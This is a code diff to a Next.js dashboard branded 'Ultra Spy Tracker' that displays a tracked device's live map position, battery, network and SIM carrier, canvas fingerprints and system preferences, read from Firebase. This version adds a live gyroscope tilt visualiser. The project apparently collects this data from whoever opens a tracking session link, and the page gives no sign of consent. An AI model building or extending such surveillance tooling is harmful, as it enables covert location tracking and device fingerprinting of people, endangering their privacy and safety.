@@ -1,11 +1,11 @@
 /**
  * ██████████████████████████████████████████████████████████████
- * TRACKER PAGE – LIVE SESSION VIEW (v5.1 – ULTRA SPY GRADE)
+ * TRACKER PAGE – LIVE SESSION VIEW (v6.0 – ULTRA SPY GRADE)
  * 
- * ✅ Fully updated for deviceDetector.ts v5.1
- * ✅ Shows ALL spy-grade data: fingerprints, HDR, GPU, system prefs, PWA, etc.
- * ✅ Beautiful, organized, modern dashboard
- * ✅ Perfect Mobile SIM vs WiFi ISP logic
+ * ✅ Fully integrated with deviceDetector.ts v5.6 + Live Gyroscope
+ * ✅ Real-time 3D Phone Tilt Visualizer (beta / gamma / alpha)
+ * ✅ All previous spy-grade data preserved
+ * ✅ Beautiful, modern, production-ready dashboard
  * ✅ No TypeScript errors
  * ██████████████████████████████████████████████████████████████
  */
@@ -18,6 +18,7 @@ import { db } from "@/lib/firebase";
 import { ref, onValue } from "firebase/database";
 import dynamic from "next/dynamic";
 import { DeviceInfo } from "@/lib/deviceDetector";
+import PhoneTiltVisualizer from "@/components/PhoneTiltVisualizer";
 
 const LiveMap = dynamic(() => import("@/components/LiveMap"), { ssr: false });
 
@@ -56,6 +57,13 @@ type SimInfo = {
   method?: string;
 };
 
+type OrientationData = {
+  alpha?: number;
+  beta?: number;
+  gamma?: number;
+  timestamp?: number;
+};
+
 type SessionData = {
   lat?: number;
   lng?: number;
@@ -68,6 +76,7 @@ type SessionData = {
   battery?: BatteryInfo;
   network?: NetworkInfo;
   sim?: SimInfo;
+  orientation?: OrientationData;     // ← NEW: Live gyroscope data
 };
 
 /* ---------------- PAGE ---------------- */
@@ -87,6 +96,9 @@ export default function TrackPage() {
   const [network, setNetwork] = useState<NetworkInfo | null>(null);
   const [sim, setSim] = useState<SimInfo | null>(null);
 
+  // 🔥 NEW: Live Orientation State
+  const [orientation, setOrientation] = useState<OrientationData | null>(null);
+
   /* ---------------- FIREBASE LISTENER ---------------- */
   useEffect(() => {
     if (!id) return;
@@ -102,25 +114,33 @@ export default function TrackPage() {
         return;
       }
 
+      // Location
       if (typeof data.lat === "number" && typeof data.lng === "number") {
         setPos({ lat: data.lat, lng: data.lng });
       }
 
+      // Timing
       const last = data.lastSeen ?? data.timestamp ?? null;
       if (typeof last === "number") setLastSeen(last);
 
       if (typeof data.pingMs === "number") setPing(data.pingMs);
       if (typeof data.accuracy === "number") setAccuracy(data.accuracy);
 
+      // Core data
       setDevice(data.device ?? null);
       setBattery(data.battery ?? null);
       setNetwork(data.network ?? null);
       setSim(data.sim ?? null);
 
+      // 🔥 Live Gyroscope
+      if (data.orientation) {
+        setOrientation(data.orientation);
+      }
+
+      // Online / Offline logic
       const now = Date.now();
       const lastTime = typeof last === "number" ? last : 0;
       const isOffline = data.status === "offline" || now - lastTime > 30000;
-
       setStatus(isOffline ? "offline" : "online");
     });
 
@@ -239,6 +259,21 @@ export default function TrackPage() {
         <h2>🕵️‍♂️ Ultra Spy Tracker Dashboard</h2>
         <p style={{ opacity: 0.6, marginBottom: 24 }}>Session ID: <strong>{id}</strong></p>
 
+        {/* 🔥 NEW: LIVE DEVICE TILT VISUALIZER */}
+        <div style={styles.cardRight}>
+          <h3>📱 Live Device Tilt (Gyroscope)</h3>
+          <PhoneTiltVisualizer
+            beta={orientation?.beta}
+            gamma={orientation?.gamma}
+            alpha={orientation?.alpha}
+          />
+          {orientation?.timestamp && (
+            <p style={{ textAlign: "center", fontSize: 13, opacity: 0.6, marginTop: 8 }}>
+              Last updated: {new Date(orientation.timestamp).toLocaleTimeString()}
+            </p>
+          )}
+        </div>
+
         {/* 1. DEVICE INFO – MAXIMUM DETAIL */}
         <div style={styles.cardRight}>
           <h3>📱 Device Info (Spy Grade)</h3>
@@ -315,7 +350,7 @@ export default function TrackPage() {
                 <p>High Contrast: {device.prefersContrast}</p>
               </div>
 
-              {/* Fingerprints (Ultra Spy) */}
+              {/* Fingerprints */}
               <div style={styles.subSection}>
                 <strong>🔑 Fingerprints</strong>
                 {device.canvasFingerprint && <p>Canvas: <span style={{ fontFamily: "monospace", fontSize: 13 }}>{device.canvasFingerprint}</span></p>}
@@ -350,7 +385,7 @@ export default function TrackPage() {
           )}
         </div>
 
-        {/* 3. INTERNET PROVIDER (SIM or WiFi) */}
+        {/* 3. INTERNET PROVIDER */}
         <div style={styles.cardRight}>
           <h3>📶 Internet Provider</h3>
           {sim && sim.carrier ? (
